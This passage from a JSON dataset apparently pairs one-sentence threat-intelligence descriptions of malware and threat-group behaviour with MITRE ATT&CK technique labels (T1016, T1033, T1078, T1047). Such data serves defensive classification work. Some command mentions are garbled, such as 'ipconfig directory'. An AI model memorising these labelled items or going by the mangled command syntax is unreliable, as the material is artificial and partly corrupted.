    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The reconnaissance modules used with Duqu can collect information on network configuration.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Elise executes ipconfig directory after initial communication is made to the remote server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Emissary has the capability to execute the command ipconfig directory",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Empire can acquire network configuration information like DNS servers and network proxies used by a host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "FALLCHILL collects MAC address and local IP address information from the victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Felismus collects the victim LAN IP address and sends it to the C2 server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT collects information about the network including the IP address and DHCP server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "GeminiDuke collects information on network settings and Internet proxy settings from the victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT collects the victim IP address, MAC address, as well as the victim account domain name.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq creates a backdoor through which remote attackers can retrieve IP addresses of compromised machines.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "ifconfig can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "iKitten will look for the current IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole gathers informatin on the IP forwarding table, MAC address, and network SSID.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "ipconfig can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Ixeshe enumerates the IP address, network proxy settings, and domain name from a victim's system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can obtain network information, including DNS, IP, and proxies.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "jRAT can gather victim internal and external IPs.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar gathers information about network adapters.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Ke3chang performs local network configuration discovery using ipconfig.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "KeyBoy can determine the public or WAN IP address for the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can retrieve information about the Windows domain.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects network adapter and interface information by using the commands ipconfig directory arp -a and route print.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "It also collects the system's MAC address with getmac and domain configuration with net config workstation.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "LightNeuron gathers information about network adapters using the Win32 API call GetAdaptersInfo.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Machete collects the MAC address of the target computer.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "menuPass has used several tools to scan for open NetBIOS nameservers and enumerate NetBIOS sessions.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Mis-Type may create a file containing the results of the command cmd directory ipconfig directory",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "MoonWind obtains the victim IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "More_eggs has the capability to gather the IP address from the victim's machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Mosquito uses the ipconfig command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Naid collects the domain name from a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Naikon uses commands such as netsh interface show to discover network interface settings.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "NanHaiShu can gather information about the victim proxy server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "nbtstat can be used to discover local NetBIOS domain names.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Nltest may be used to enumerate the parent domain of a local machine using directory",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "NOKKI can gather information on the victim IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has run ipconfig directory on a victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Olympic Destroyer uses API calls to enumerate the infected system's ARP table.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Orz can gather victim proxy information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "OSInfo discovers the current domain information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Pisloader has a command to collect the victim's IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "PoshC2 can enumerate network adapter information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "PowerDuke has a command to get the victim's domain and NetBIOS name.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "POWERSTATS can retrieve IP and network adapter configuration information from compromised hosts.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER may collect network configuration data by running ipconfig directory on a victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "A module in Prikormka collects information from the victim about its IP addresses and MAC addresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Proxysvc collects the network adapter information and domain/username information based on current remote sessions.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "QUADAGENT gathers the current domain the victim system belongs to.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Reaver collects the victim's IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "RedLeaves can obtain information about network parameters.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Remsec can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Revenge RAT collects the IP address and MAC address from the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "route can be used to discover routing configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Shamoon obtains the target's IP address and local network segment.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Soft Cell used ipconfig directory to obtain information about the victim network configuration.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The group also ran a modified version of nbtscan to identify available NetBIOS name servers.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "SpeakUp uses the ifconfig -a command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Stealth Falcon malware gathers the Address Resolution Protocol table from the victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Sykipot may use ipconfig directory to gather system network configuration details.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Sys10 collects the local IP address of the victim and sends it to the C2.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Threat Group-3390 actors use nbtscan to discover vulnerable systems.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover network configuration details using the arp -a, nbtstat -n, nbtscan, and net config commands.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Turla RPC backdoors have also retrieved registered RPC interface information from process memory.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Unknown Logger can obtain information about the victim's IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "UPPERCUT has the capability to gather the victim's proxy information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "VERMIN gathers the local IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Volgmer can gather the IP address from the victim's machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "WannaCry will attempt to determine the local network segment it is a part of.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "yty runs ipconfig directory and collects the domain name.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy runs the ipconfig directory command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "ZeroT gathers the victim's IP address and domain information, and then sends it to its C2 server.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "zwShell can obtain the victim IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Agent obtains the victim username and saves it to a file.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "APT32 collected the victim's username and executed the whoami command on the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "APT37 identifies the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "APT39 used Remexi to collect usernames from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "APT41 used the WMIEXEC utility to execute whoami commands on remote machines.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "BabyShark has executed the whoami command.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Backdoor.Oldrea collects the current username from the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "BISCUIT has a command to gather the username from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Cannon can gather the username from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT can collect the username from a victim machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Derusbi also gathers the username of the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "DownPaper collects the victim username and sends it to the C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly 2.0 used the command query user on victim hosts.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Felismus collects the current username and sends it to the C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "FIN10 has used Meterpreter to enumerate users on remote systems.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "FlawedAmmyy enumerates the current user during the initial infection.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "A Gamaredon Group file stealer can gather the victim's username to send to a C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Gazer obtains the current user's security identifier.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Gold Dragon collects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT collects the victim username along with other account information .",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "HAWKBALL can collect the user name of the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole lists local users and session information.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar gathers information on users.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can identify logged in users across the domain and views user sessions.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The OsInfo function in Komplex collects the current running username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs collects registered owner details by using the commands systeminfo and net config workstation.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Various Lazarus Group malware enumerates logged-on users.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Magic Hound malware has obtained the victim username and sent it to the C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Mis-Type runs tests to determine the privilege level of the compromised user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "MoonWind obtains the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "More_eggs has the capability to gather the username from the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "NanHaiShu collects the username from the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "NDiskMonitor obtains the victim username and encrypts the information to send over its C2 channel.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "njRAT enumerates the current user during the initial infection.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has run whoami on a victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Patchwork collected the victim username and whether it was running as admin, then sent the information to its C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "PowerDuke has commands to get the current user's name and SID.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER may collect information about the currently logged in user by running whoami on a victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "A module in Prikormka collects information from the victim about the current user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Pupy can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "QUADAGENT gathers the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "RATANKBA runs the whoami and query user commands.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Reaver collects the victim's username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "RedLeaves can obtain information about the logged on user both locally and for Remote Desktop sessions.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Remsec can obtain information about the current user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Revenge RAT gathers the username from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "RTM can obtain the victim username and permissions.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "ServHelper will attempt to enumerate the username of the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Soft Cell used whoami and query user to obtain information about the victim user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SpeakUp uses the whoami command.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SslMM sends the logged-on username to its hard-coded C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Stealth Falcon malware gathers the registered user and primary owner name via WMI.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "SynAck gathers user names from infected hosts.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Sys10 collects the account name of the logged-in user and sends it to the C2.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "T9000 gathers and beacons the username of the logged in account during installation.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "It will also gather the username of running processes to determine if it is running as SYSTEM.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper used letmein to scan for saved usernames on the target system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Unknown Logger can obtain information about the victim usernames.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "WINDSHIELD can gather the victim user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "WINERACK can gather information on the victim username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "XAgentOSX contains the getInfoOSX function to return the OS X version as well as the current user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy gets the username from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "zwShell can obtain the name of the logged-in user on the victim.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell can collect the owner and organization information from the target workstation.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "APT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT3 leverages valid accounts after gaining credentials for use within the victim domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT32 has used legitimate local admin account credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT33 has used valid accounts for initial access and privilege escalation.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT39 has used stolen credentials to compromise Outlook Web Access .",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT41 used compromised credentials to log on to other systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Carbanak actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can use known credentials to run commands and spawn processes as another user.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly 2.0 compromised user credentials and used valid accounts for operations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Emotet can brute force a local admin password, then use it to facilitate lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "FIN10 has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The group has also moved laterally using the Local Administrator account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "FIN4 has used legitimate credentials to hijack email communications.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "FIN8 has utilized Valid Accounts during and Persistence and Lateral Movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Leviathan has used valid, compromised email accounts for defense evasion, including to send malicious emails to other victim organizations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Linux Rabbit acquires valid SSH accounts through brute force.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "menuPass has used valid accounts shared between Managed Service Providers and clients to move between the two environments.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "NotPetya can use valid credentials with PsExec or wmic to spread itself to remote systems.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has used compromised credentials to access other systems on a victim network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "PittyTiger attempts to obtain legitimate credentials during operations.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Soft Cell leveraged valid accounts to maintain access to a victim network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "TEMP.Veles has used compromised VPN accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Threat Group-1314 actors used compromised credentials for the victim's endpoint management platform, Altiris, to move laterally.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Umbreon creates valid users to provide access to the system.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT29 used WMI to steal credentials and execute backdoors at a future time.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "APT32 used WMI to deploy their tools on remote machines and to gather information about the Outlook process.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "APT41 used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Astaroth uses WMIC to execute payloads.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "A BlackEnergy 2 plug-in uses WMI to gather victim host details.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can use WMI to deliver a payload to a remote host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The Deep Panda group is known to utilize WMI for lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "The DustySky dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Emotet has used WMI to execute powershell .",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Empire can use WMI to deliver a payload to a remote host.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "EvilBunny has used WMI to gather information about the system.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT uses WMI to query the Windows Registry.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "FIN6 has used WMI to automate the remote execution of PowerShell scripts.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd execution.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "FIN8 has also used WMIC during and post compromise cleanup activities.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "FlawedAmmyy leverages WMI to enumerate anti-virus on the victim.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "GravityRAT collects various information via WMI requests, including CPU information in the Win32_Processor entry .",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "HALFBAKED can use WMI queries to gather system information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "HOPLIGHT has used WMI to recompile the Managed Object Format files in the WMI repository.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Impacket's wmiexec module can be used to execute commands through WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Kazuar obtains a list of running processes through WMI querying.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can use WMI to execute commands.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "KOMPROGO is capable of running WMI queries.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware SierraAlfa uses the Windows Management Instrumentation Command-line application wmic to start itself on a target system during lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Leviathan has used WMI for execution.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "menuPass uses a modified version of pentesting script wmiexec , which logs into a remote machine using WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Mosquito's installer uses WMI to search for antivirus display names.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "MuddyWater has used malware that leveraged WMI for execution and querying host information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "NotPetya can use wmic to help propagate itself across a network.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Octopus uses wmic for local discovery information.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "OilRig has used WMI for execution.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Olympic Destroyer uses WMI to help propagate itself across a network.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "OopsIE uses WMI to perform discovery techniques.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "PoshC2 has a number of modules that use WMI to execute tasks.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "PowerSploit's Invoke-WmiCommand CodeExecution module uses WMI to execute and retrieve the output from a PowerShell payload.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "POWERSTATS can use WMI queries to retrieve data from compromised hosts.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER may use WMI when collecting information about a victim.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "RATANKBA uses WMI to perform process monitoring.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Remexi executes received commands with wmic .",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "RogueRobin uses various WMI queries to check if the sample is running in a sandbox.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Soft Cell used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "StoneDrill has used the WMI command-line utility to run tasks.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
